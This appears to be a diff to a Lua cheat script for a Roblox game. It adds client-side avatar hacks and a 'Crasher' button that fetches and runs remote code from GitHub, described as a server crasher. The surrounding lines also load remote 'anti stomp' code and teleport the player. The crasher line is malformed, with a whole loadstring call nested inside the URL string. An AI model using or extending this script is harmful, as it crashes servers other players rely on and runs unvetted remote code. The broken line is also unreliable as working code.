@@ -49,6 +49,35 @@ main8:NewLabel("Stomp Stuff")
 main8:NewButton("Anti Stomp", "Other Players cant stomp you", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/neverlackinga/antistomp/main/nostomp.lua"))()
 end)
+local main8 = main7:NewSection("Avatar stuff")
+main8:NewButton("korblox right leg", "", function()
+	local ply = game.Players.LocalPlayer
+	local chr = ply.Character
+	chr.RightLowerLeg.MeshId = "902942093"
+	chr.RightLowerLeg.Transparency = "1"
+	chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+	chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+	chr.RightFoot.MeshId = "902942089"
+	chr.RightFoot.Transparency = "1"
+end)
+main8:NewButton("korblox left leg", "", function()
+	local ply = game.Players.LocalPlayer
+	local chr = ply.Character
+	chr.LeftLowerLeg.MeshId = "902942093"
+	chr.LeftLowerLeg.Transparency = "1"
+	chr.LeftUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+	chr.LeftUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+	chr.LeftFoot.MeshId = "902942089"
+	chr.LeftFoot.Transparency = "1"
+end)
+main8:NewButton("headless", "", function()
+game.Players.LocalPlayer.Character.Head.Transparency = 1
+for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+if (v:IsA("Decal")) then
+v:Destroy()
+end
+end
+end)
 main8:NewLabel("Teleports")
 main8:NewButton("DB", "DB mountian", function()
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1087.02783, 104.254997, -268.160614, 0.0359299146, -0.000130457382, -0.99935472, -2.87694893e-05, 1, -0.000131575929, 0.99935472, 3.34783836e-05, 0.0359299146)
@@ -100,4 +129,8 @@ main15:NewKeybind(
     Enum.KeyCode.RightControl,
     function()
 	main1:ToggleUI()
+end)
+local main15 = main14:NewSection("Crasher")
+main15:NewButton("Starts Crasher", "Loads Server crasher", function()
+loadstring(game:HttpGet("loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()"))()
 end)
